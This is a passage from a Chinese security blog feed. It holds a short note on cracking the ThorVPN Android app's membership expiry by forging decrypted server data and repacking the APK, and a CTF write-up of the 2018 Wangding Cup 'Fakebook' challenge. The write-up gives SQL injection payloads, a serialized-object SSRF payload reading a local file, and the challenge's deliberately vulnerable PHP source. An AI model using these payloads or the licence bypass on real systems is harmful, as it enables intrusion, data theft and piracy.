      <url>/2021/05/21/ThorVPN%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8%E6%9C%89%E6%95%88%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="ThorVPN"><a href="#ThorVPN" class="headerlink" title="ThorVPN"></a>ThorVPN</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>根据提示字符串“还剩x天会员”</p><p>-&gt;res&#x2F;values-zh-rCN&#x2F;strings.xml:: 205:     <string name="message_default">会员还有{}天</string></p><p>-&gt;在代码中找的该字符串的引用 find:message_default，即R0.string.message_default</p><p>阅读该段代码逻辑，得到service_expired_time进行判断，所以目标是对service_expired_time通过交叉引用找到获得这个字符串的地方<br><img src="/2021/05/21/ThorVPN%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8%E6%9C%89%E6%95%88%E6%9C%9F/1F3380F1-0028-4FA2-A012-AE2FD45E5CA0.png" alt="bc4965505e9f63de4eeedf877e9efc73"></p><p>在进入处理这个字符串逻辑之前得到服务器返回的str，进行解密、把json转换成map保存</p><h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>通过自己解密str，和app log输出比对，得到原始json串的格式内容，自己模拟写map数据并转换成smali保存到app中重打包<br><img src="/2021/05/21/ThorVPN%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8%E6%9C%89%E6%95%88%E6%9C%9F/AAD68742-6B23-49E3-93EF-05A4E5FDD481.png" alt="544d876e24f44459a270e7b6ce738ee0"></p><h2 id="tcpdump数据"><a href="#tcpdump数据" class="headerlink" title="** tcpdump数据 **"></a>** tcpdump数据 **</h2><p>在不通过中间人情况下得到手机的数据包</p><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><p>APK:ThorVPN 0.9+<br>refer:<a href="https://mp.weixin.qq.com/s/ih4pIs8NjFPWolV-1uF6PQ">https://mp.weixin.qq.com/s/ih4pIs8NjFPWolV-1uF6PQ</a></p><h2 id="待解决"><a href="#待解决" class="headerlink" title="待解决"></a>待解决</h2><p>TLS抓包</p>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidReverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018 Fakebook(sql注入+ssrf)</title>
      <link href="/2021/02/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook(sql%E6%B3%A8%E5%85%A5+ssrf)/"/>
      <url>/2021/02/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook(sql%E6%B3%A8%E5%85%A5+ssrf)/</url>
      
        <content type="html"><![CDATA[<p>通过网站功能，猜测存在ssrf，因为读和解析url_blog<br>但是直接在注册功能处通过file:&#x2F;&#x2F;{flag}不成功，猜测是过滤了，源码中isValidBlog确实检测了http，然后注册<a href="http://flag.php,查看后无内容返回,应该是没有回显,以$flag的形式存在/">http://flag.php，查看后无内容返回，应该是没有回显，以$flag的形式存在</a></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>注册后访问id存在sql注入</p><p>payload:</p><p>这个题用报错注入也能成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?n0=<span class="number">0</span>%<span class="number">20</span>union<span class="comment">/**/</span>select%<span class="number">201</span>,<span class="title function_ invoke__">database</span>(),<span class="number">3</span>,<span class="number">4</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><blockquote><p>注意select的字段位置，由源码得知数据库字段为no(int),username(char),age(int),data(char)，database()是字符串，在2，4位置能报出来，但4需要unserialize，输入的内容是序列化的字符串，只能在2爆</p></blockquote><blockquote><p>union是联合，如果前一个select正确时，不会返回右边的select结果</p></blockquote><p>盲注：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;1+and+(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))=&#123;&#125;)%23&#x27;</span>.<span class="title function_ invoke__">format</span>(i, j)</span><br><span class="line">payload = <span class="string">&#x27;1+and+(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=test)),&#123;&#125;,1))=&#123;&#125;)%23&#x27;</span>.<span class="title function_ invoke__">format</span>(i,j)</span><br><span class="line">payload = <span class="string">&#x27;1+and+(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\&#x27;users\&#x27;)),&#123;&#125;,1))=&#123;&#125;)%23&#x27;</span>.<span class="title function_ invoke__">format</span>(i,j)</span><br><span class="line">payload = <span class="string">&#x27;1+and+(ascii(substr((select(group_concat(passwd))from(users)),&#123;&#125;,1))=&#123;&#125;)%23&#x27;</span>.<span class="title function_ invoke__">format</span>(i,j)</span><br></pre></td></tr></table></figure><p>爆出来<br>database &#x3D; ‘fakebook’<br>table_name &#x3D; ‘users’<br>columns &#x3D; ‘no,username,passwd,data’<br>data &#x3D; O:8:”UserInfo”:3:{s:4:”name”;s:1:”1”;s:3:”age”;i:1;s:4:”blog”;s:20:”<a href="http://www.baidu.com&quot;;}/">http://www.baidu.com&quot;;}</a></p><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p>unserialize data 得到UserInfo类name、age、blog<br>结合curl(blog)，存在ssrf<br>在blog通过file:&#x2F;&#x2F;读取flag文件<br>构造payload序列化<br>（这题存在filescan，robots.txt-&gt;user.php.bak，可以知道UserInfo类具体内容，和blacklists，我直接猜了）<br><img src="/2021/02/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook(sql%E6%B3%A8%E5%85%A5+ssrf)/60AD6330-7784-4534-8FE0-FBB668942E2A.png" alt="3a4827e7c285893174183153d4404356"></p><p>然后通过sql注入得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//$a=&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="comment">//print_r(unserialize($a));</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="comment">//echo $a;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>); <span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span>                </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0%20union/**/select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;%27%20from%20users%20%23</span><br></pre></td></tr></table></figure><blockquote><p>有个小技巧，不需要base64decode，直接查看chrome网页源代码得到解码后的<br><img src="/2021/02/14/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook(sql%E6%B3%A8%E5%85%A5+ssrf)/31567B76-5C98-45E8-8824-CFE78046826D.png" alt="42d1bcc4865cf7b270958db4013ac01a"></p></blockquote><h2 id="ssrf-网页源码"><a href="#ssrf-网页源码" class="headerlink" title="ssrf_网页源码"></a>ssrf_网页源码</h2><p>通过这种方式得到部分源码：</p><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">session_start</span>(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;error.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">DB</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;ko&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;User&lt;/title&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;bootstrap.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">anti_sqli</span>(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getUserByNo</span>(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">table</span> <span class="title">class</span>=&quot;<span class="title">table</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                <span class="title">username</span></span></span><br><span class="line"><span class="class">            &lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                <span class="title">age</span></span></span><br><span class="line"><span class="class">            &lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                <span class="title">blog</span></span></span><br><span class="line"><span class="class">            &lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">res</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">user</span>-&gt;<span class="title">age</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">xss</span>($<span class="title">user</span>-&gt;<span class="title">blog</span>); ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">br</span>&gt;&lt;<span class="title">br</span>&gt;&lt;<span class="title">br</span>&gt;&lt;<span class="title">br</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;<span class="title">the</span> <span class="title">contents</span> <span class="title">of</span> <span class="title">his</span>/<span class="title">her</span> <span class="title">blog</span>&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    $<span class="title">response</span> = $<span class="title">user</span>-&gt;<span class="title">getBlogContents</span>();</span></span><br><span class="line"><span class="class">    <span class="title">if</span> ($<span class="title">response</span> === 404)</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$base64</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// echo $response;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>db.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;naiwjebfahjebfja&#x27;</span>, <span class="string">&#x27;fakebook&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// $mysqli = new mysqli(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;!@#1234!@#&#x27;, &#x27;fakebook&#x27;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidUsername</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">sha512</span>(<span class="variable">$passwd</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and passwd = &#x27;<span class="subst">&#123;$passwd&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$username</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">sha512</span>(<span class="variable">$passwd</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;insert into users (username, passwd, data) values (&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;, &#x27;<span class="subst">&#123;$passwd&#125;</span>&#x27;, &#x27;<span class="subst">&#123;$data&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">real_query</span>(<span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllUsers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_all</span>(MYSQLI_ASSOC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserByNo</span>(<span class="params"><span class="variable">$no</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $no = addslashes($no);</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where no = <span class="subst">&#123;$no&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$res</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;[*] query error! (<span class="subst">&#123;$mysqli-&gt;error&#125;</span>)&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 